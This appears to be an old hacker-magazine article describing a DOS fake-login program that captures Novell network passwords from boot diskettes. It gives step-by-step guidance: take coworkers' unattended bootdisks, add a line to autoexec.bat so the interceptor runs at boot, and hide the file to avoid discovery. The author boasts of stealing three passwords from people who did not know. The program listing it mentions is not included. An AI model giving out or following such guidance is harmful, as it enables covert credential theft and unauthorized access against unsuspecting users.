PASSWORD HACK

                      PASSWORD INTERCEPTOR IN DOS
                            - by Slimer -

==============================================================================


Only for Novell and stations that use a bootdiskette      ~KEY.BL2~
****************************************************
It doesn't properly work with Ethernet !
****************************************

There are many ways to get a password but I think that there isn't a
more easier way then the simple piece of code in this article.
If you have a PC on a Novell network that needs a bootdisk then this is
the ideal program to snatch the password of somebody else.

At my work we use an outdated system called ARCnet but if you want to use 
the small "interceptor" with another system (Ethernet or so) you probably
have to alter the code a bit.

My personal expierence is that most users always let the bootdisk floating
around the office or have it lying in their drawer.  
It's not hard to get hold of their bootdisk, maybe you even use eachothers
bootdisk then it's even more easy !

EXPLANATION
***********
The program works very simple, it fakes the login procedure and writes the
password to disk.
When you type in your password you sometimes make a type mistake and get
thrown out of the procedure !
The program lets you think that you made a typing mistake while it catches
your password.
   
Don't worry the program is tested on several people and it worked like a
charm.
Those people knew nothing about it, I managed to obtain 3 passwords this way.

The listing below is the original version of the program.
I will explain what happens step by step with remarks, you will also find
a version without the remarks in this article.
People who know Dos should have no problems at all with it(it's simple) !

I made also an auto install program which installs the interceptor on the
disk but only I use that one.
The code used in the install program is changed for a faster performance !

One final remark: the program doesn't work without the program "WHAT" which
must also be installed on the disk ( WHAT.EXE can be found in the program
folder on this disk, just copy it to a MS-Dos formatted disk ).

REMOVE write protect for use !

The "interceptor" is only 17 lines, as you may have noticed it looks very 
much like a basic listing.
DOS doesn't know the command WHAT, this command can only be used when you
copy the little program called WHAT.EXE to the root dir. of your Hard-disk 
or boot disk. 
The little program gives you a couple of extra features within DOS !
WHAT.EXE has many more features, you just have type <WHAT> to see
a list of these features.

To make the interceptor program work is to copy it to the bootdisk and change 
the autoexec.bat like this,

@echo off
IPX
NET3 (or higher)
Prompt $p$g
A:\pass.bat      <----(simple hey)

This will do the trick.......

If you have Norton Commander then you can hide the "interceptor" on the
disk, that makes chance of discovery very small.

SOME LAST WORDS
***************

It is possible that the "interceptor" doesn't work properly on your system,
you are ofcourse free to alter the code.
The program is only made to give you an idea(!) how simple such a Dos 
"interceptor" can be coded.
As I said before the WHAT program can be found on the D.B.A. magazine disk.

When you use this program, it will be at your own risk because we don't take
any responsibility for your actions.
The "interceptor" is only coded to show everybody that you don't have to go
to enormous efforts to get the password of somebody else.
  
The people of the automation department at my work thought it was rather
amazing when they saw the simplicity of it.
I won't mention what they said when they saw it actually work !
